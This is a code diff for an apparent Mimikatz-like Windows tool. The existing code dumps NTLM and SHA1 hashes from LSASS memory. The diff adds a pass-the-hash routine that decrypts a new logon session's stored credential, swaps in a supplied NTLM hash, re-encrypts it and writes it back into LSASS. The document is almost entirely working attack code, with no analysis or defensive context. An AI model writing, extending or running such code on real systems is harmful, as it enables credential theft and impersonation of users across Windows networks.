@@ -3,12 +3,16 @@
 #include "common.h"
 #include "process.h"
 #include "cng.h"
+#include "pth.h"
 
 static IMAGE_PATTERN lsasrv_LogonSessList[] = {
 	{ 0x000a00003fab0135, 0x3948088b48c10348, -4 }, //win10x64 1709
 	{ 0x000a000042ee00fe, 0x3948088b48c10348, -4 }, //win10x64 1803
 	{ 0, 0, 0 }
 };
+
+LUID AuthenticationId = { 0 };
+BYTE NTLMHASH[LM_NTLM_HASH_LENGTH] = { 0 };
 
 LPVOID Find_LogonSessList()
 {
@@ -70,6 +74,10 @@ BOOL Msv1_0_LogonSessList_Dump()
 			MESSAGE(L"NTLM: , SHA1: \r\n");
 			continue;
 		}
+
+		MESSAGE(L"LocallyUniqueIdentifier:%d %d\r\n", lpSessionEntry->LocallyUniqueIdentifier.HighPart,
+			lpSessionEntry->LocallyUniqueIdentifier.LowPart);
+
 		bRet = ReadLsassMemory(lpSessionEntry->Credentials, &szCredentials, sizeof(szCredentials));
 		bRet = ReadLsassMemory(szCredentials.PrimaryCredentials, &szPrimaryCredentials,
 			sizeof(szPrimaryCredentials));
@@ -82,7 +90,32 @@ BOOL Msv1_0_LogonSessList_Dump()
 		MESSAGE(L"\tSHA1: ");
 		DigestDump((LPBYTE)& lpPrimaryCredential->ShaOwPassword, SHA_DIGEST_LENGTH);
 		MESSAGE(L"\r\n");
+
+		//PTH测试
+		if (lpSessionEntry->LogonType == LOGON32_LOGON_NEW_CREDENTIALS &&
+			lpSessionEntry->LocallyUniqueIdentifier.LowPart == AuthenticationId.LowPart)
+			MSV1_0_NTLM_Copy(&szPrimaryCredentials.Credentials);
 	} while (lpSessionEntry->Flink != lpLogonSessionEntry);
 
 	return TRUE;
+}
+
+VOID MSV1_0_NTLM_Init(LPBYTE lpNTLM)
+{
+	RETN_MSG_IF(!LogonWithNewCredential(&AuthenticationId.LowPart), , L"Cant logon with new credential?\r\n");
+	RtlCopyMemory(NTLMHASH, lpNTLM, LM_NTLM_HASH_LENGTH);
+}
+
+VOID MSV1_0_NTLM_Copy(PLSA_UNICODE_STRING lpCredBuffer)
+{
+	BOOL bRet = FALSE;
+	BYTE szBuffer[1024] = { 0 };
+	ReadLsassLSAString(lpCredBuffer, szBuffer);
+	PMSV1_0_PRIMARY_CREDENTIAL_10_1607 lpPrimaryCredential = (PMSV1_0_PRIMARY_CREDENTIAL_10_1607)&szBuffer;
+	LsaEncryptMemory(szBuffer, lpCredBuffer->Length, 0); //解密
+	RtlCopyMemory(lpPrimaryCredential->NtOwfPassword, NTLMHASH, LM_NTLM_HASH_LENGTH);        //修改
+	LsaEncryptMemory(szBuffer, lpCredBuffer->Length, 1); //加密
+	bRet = WriteLsassMemory(lpCredBuffer->Buffer, szBuffer, lpCredBuffer->Length); //写回LSA
+	if (!bRet)
+		MESSAGE(L"WriteLsassMemory error\r\n");
 }
